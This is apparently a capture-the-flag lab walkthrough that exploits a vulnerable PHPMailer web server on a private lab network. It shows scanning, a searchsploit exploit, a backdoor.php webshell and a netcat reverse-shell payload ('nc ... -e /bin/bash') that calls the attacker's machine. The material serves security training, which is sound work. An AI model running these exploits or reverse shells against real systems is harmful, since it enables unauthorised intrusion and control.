# **TARGET 2 Offensive WalkThrough**

## Overview

You are working as a Security Engineer for X-CORP, supporting the SOC infrastructure. The SOC analysts have noticed some discrepancies with alerting in the Kibana system and the manager has asked the Security Engineering team to investigate.

To start, your team needs to confirm that newly created alerts are working. Once the alerts are verified to be working, you will monitor live traffic on the wire to detect any abnormalities that aren't reflected in the alerting system.

You will then report back all your findings to both the SOC manager and the Engineering Manager with appropriate analysis.

>##### Note: This is a walkthrough detailing one method to exploit the vulnerable machine. Likewise, other techniques have been explored. Look at the PowerPoint presentation and the Penetration Testing Report Target 2 to find more methods not specified in this walkthrough.

---

Tools:

- Kali Linux
- Q shell
- Namp
- Nikto
- Gobuster
- FireFox Browser
- Searchsploit
- Bash Script
- NetCat

---

## **Walkthrough**

1. A glimpse at the Kali Linux machine IP and network addresses.

        ifconfig

    ![1](/Images/4/1.PNG)

2. Network FootPrinting (find machines on the network).

        nmap 192.168.1.0/24

    ![2](/Images/4/2.PNG)

3. Target2 fingerprinting (find services and ports on target2).

        nmap -sV 192.168.1.115 

    ![3](/Images/4/3.PNG)

4.  Look for Webserver vulnerabilities using Nikto.

        nikto -C all -h 192.168.1.115

    ![4](/Images/4/4.PNG)

5. Scan for paths using Gobuster.

        gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt dir -e -u http://192.168.1.115

    ![5](/Images/4/5.PNG)

6. Explore path `192.168.1.115/vendor/` using the browser.
   
        192.168.1.115/vendor/

    **PHPMAILER detected.**

    ![6](/Images/4/6.PNG)     
   
7. Double click "PATH".

    **flag1**

    ![7](/Images/4/7.PNG)

8. Double "Click SECURITY.md".

    **It reveals vulnerable versions of PHPMAILER.**

    ![8](/Images/4/8.PNG)    

9.  Double "Click VERSION".

    **It reveals the PHPMAILER version in use.**

    ![9](/Images/4/9.PNG)  

10. Search for scripts to exploit PHPMAILER with Searchsploit.

        searchsploit phpmailer

    ![10](/Images/4/10.PNG)  

11. A glance at script 40968.sh

        searchsploit phpmailer -x php/webapps/40968.sh     

    **Press "q" keyboard to quit view.**

    ![11](/Images/4/11.PNG) 

12. Download the script to the current folder.

        searchsploit phpmailer -m php/webapps/40968.sh

    ![12](/Images/4/12.PNG)

13. Authorize file to execute.

        sudo chmod 777 40968.sh

14. Run exploit.

        ./40968.sh 192.168.1.115

    ![13](/Images/4/13.PNG)

    > Note: PHPMAILER can be exploited. Nevertheless,  the shell from this script does not allow us to do much. After researching, "exploit.sh" was discovered. It allows for creating a more useful shell.

    Script: [exploit.sh](/Resources/explot.sh)

15. Change the URL on the script.

        nano exploit.sh

    ##### Note: **To exit nano: "CTRL X", then "y" and "enter".**

    ![14](/Images/4/14.PNG)

16. Authorize file to execute.

         sudo chmod 777 exploit.sh

17. Execute the file.

        ./exploit.sh

    ![15](/Images/4/15.PNG)

18. Set Kali Linux Machine to listen using the NetCat command.

         nc -lnvp 4444

    ![16](/Images/4/16.PNG)

19. Make Target2 call the Kali Linux machine with the NetCat command embedded in the next payload after running it in the browser.

        192.168.1.115/backdoor.php?cmd=nc 192.168.1.101 4444 -e /bin/bash

    **Change the second IP address in the payload to the IP address of your own kali Linux machine.**

    ![17](/Images/4/17.PNG)

20. Look for flags.

        find /var/www -type f -iname 'flag*'

    **flag2 and flag3.**

    ![18](/Images/4/18.PNG)

21. Open the flag2 file.

        cat /var/www/flag2.txt

    **flag2**

    ![19](/Images/4/19.PNG)

23. Insert the path for flag 3 in the browser.

        http://192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png

    **flag3**
   ![21](/Images/4/21.PNG)